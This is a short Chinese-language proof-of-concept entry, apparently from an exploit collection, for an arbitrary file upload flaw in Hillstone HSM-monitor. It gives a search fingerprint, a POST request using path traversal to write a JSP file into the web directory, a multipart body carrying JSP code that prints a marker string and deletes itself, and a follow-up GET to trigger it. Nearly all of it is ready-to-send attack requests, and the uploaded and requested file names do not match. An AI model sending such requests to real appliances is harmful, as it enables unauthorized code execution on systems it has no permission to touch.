# 山石网科HSM-monitor存在任意文件上传漏洞

- **系统**：山石网科　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="login_hsm-all.css"`
- **请求**：`POST /ft//stoneos/monitor?sn=1&fileName=../../../../hsmprogram/service/application/WebDaemon/errors/2.jsp HTTP/1.1`

**请求体 / payload**
```
上传访问:9093
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain
<% out.println("202cb962ac59075b964b07152d234b70");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryABC123--
文件访问为原ip地址+端口
GET /errors/2111.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—